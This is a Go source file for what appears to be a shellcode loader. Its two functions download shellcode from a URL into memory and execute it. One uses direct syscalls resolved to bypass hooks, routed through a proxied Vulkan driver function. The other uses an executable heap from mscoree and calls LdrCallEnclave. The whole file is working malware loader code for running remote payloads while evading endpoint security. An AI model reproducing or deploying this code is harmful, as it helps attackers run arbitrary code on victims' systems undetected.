package vulkan

import (
	"runtime"
	"runtime/debug"
	"unsafe"

	"github.com/carved4/vk-loader/pkg/finder"
	"github.com/carved4/vk-loader/pkg/net"

	wc "github.com/carved4/go-wincall"
)

const (
	CHECKSUM_04       = 0x10ADED040410ADED // Standard variant - checks *arg1
	CHECKSUM_02       = 0x10ADED020210ADED // Variant - checks arg1[2]
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20
	HEAP_ZERO_MEMORY  = 0x00000008
)

type EgStr struct {
	V1     uint64       // arg1[0] - pointer to Table
	V2     uint64       // arg1[1] - pointer to extended memory for conditional checks
	V3     uint64       // arg1[2] - checksum for 0x02 variant
	V4     uint64       // arg1[3] - parameter for function calls
	Table  [256]uint64  // The function table
	ExtMem [0x2000]byte // Extended memory for conditional logic (0x139b bytes needed)
}

// setupVulkanContext initializes a new Vulkan function and EgStr for execution
func setupVulkanContext() (uintptr, *EgStr, uint64) {
	debug.SetGCPercent(-1)

	vulnFunc, _ := finder.FindVulkanFunction()
	funcaddr := vulnFunc.Address
	tableIndex := vulnFunc.Index
	_ = vulnFunc.Index2
	checksumVariant := vulnFunc.ChecksumVariant

	var ex EgStr

	switch checksumVariant {
	case finder.ChecksumAt0:
		ex.Table[0] = CHECKSUM_04
		ex.V1 = uint64(uintptr(unsafe.Pointer(&ex.Table[0])))
	case finder.ChecksumAt2:
		ex.V1 = uint64(uintptr(unsafe.Pointer(&ex.Table[0])))
		ex.V2 = uint64(uintptr(unsafe.Pointer(&ex.ExtMem[0])))
		ex.V3 = CHECKSUM_02
		ex.V4 = 1
		ex.ExtMem[0x139b] = 1
	default:
		ex.Table[0] = CHECKSUM_04
		ex.V1 = uint64(uintptr(unsafe.Pointer(&ex.Table[0])))
	}

	return funcaddr, &ex, tableIndex
}

func Vulkan1(url string) {
	driverFunc, ex, tableIndex := setupVulkanContext()

	var shellcode []byte

	shellcode, _ = net.DownloadToMemory(url)
	allocSSN, _, _ := wc.GetSyscallWithAntiHook("NtAllocateVirtualMemory")
	writeSSN, _, _ := wc.GetSyscallWithAntiHook("NtWriteVirtualMemory")
	protectSSN, _, _ := wc.GetSyscallWithAntiHook("NtProtectVirtualMemory")
	createThreadSSN, _, _ := wc.GetSyscallWithAntiHook("NtCreateThreadEx")
	waitSSN, _, _ := wc.GetSyscallWithAntiHook("NtWaitForSingleObject")

	proc := ^uintptr(0) // current process
	var base uintptr
	size := uintptr(len(shellcode))
	region := size

	_ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(allocSSN),
		proc,
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&region)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	_, _, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	var written uintptr
	_ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(writeSSN),
		proc,
		base,
		uintptr(unsafe.Pointer(&shellcode[0])),
		size,
		uintptr(unsafe.Pointer(&written)),
	)
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	_, _, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	var oldProtect uintptr
	region = size
	_ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(protectSSN),
		proc,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&region)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	_, _, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	var thread uintptr
	_ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(createThreadSSN),
		uintptr(unsafe.Pointer(&thread)),
		uintptr(0x1FFFFF),
		0,
		proc,
		base,
		0,
		0,
		0,
		0,
		0,
	)
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	_, _, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	_ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(waitSSN),
		thread,
		0,
		0,
	)
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	_, _, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	runtime.KeepAlive(&base)
	runtime.KeepAlive(&region)
	runtime.KeepAlive(shellcode)
	runtime.KeepAlive(&oldProtect)
	runtime.KeepAlive(&thread)
}

// Custom memcpy implementation
func memcpy(dst, src uintptr, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
	}
}

func Vulkan2(url string) {
	driverFunc, ex, tableIndex := setupVulkanContext()

	var shellcode []byte

	shellcode, _ = net.DownloadToMemory(url)

	wc.LoadLibraryW("mscoree.dll")
	mscoree := wc.GetModuleBase(wc.GetHash("mscoree.dll"))
	getProcessHeapAddr := wc.GetFunctionAddress(mscoree, wc.GetHash("GetProcessExecutableHeap"))

	kernel32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	heapAllocAddr := wc.GetFunctionAddress(kernel32, wc.GetHash("HeapAlloc"))

	ntdll := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	ldrCallEnclaveAddr := wc.GetFunctionAddress(ntdll, wc.GetHash("LdrCallEnclave"))

	_ = wc.SetCallbackN(uintptr(getProcessHeapAddr))
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	heapHandle, _, _ := wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	_ = wc.SetCallbackN(uintptr(heapAllocAddr), heapHandle, HEAP_ZERO_MEMORY, uintptr(len(shellcode)))
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	allocatedMem, _, _ := wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	memcpy(allocatedMem, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	var result uintptr
	_ = wc.SetCallbackN(uintptr(ldrCallEnclaveAddr), allocatedMem, 0, uintptr(unsafe.Pointer(&result)))
	ex.Table[tableIndex] = uint64(wc.CallbackPtr())
	_, _, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))

	runtime.KeepAlive(shellcode)
	runtime.KeepAlive(&result)
}
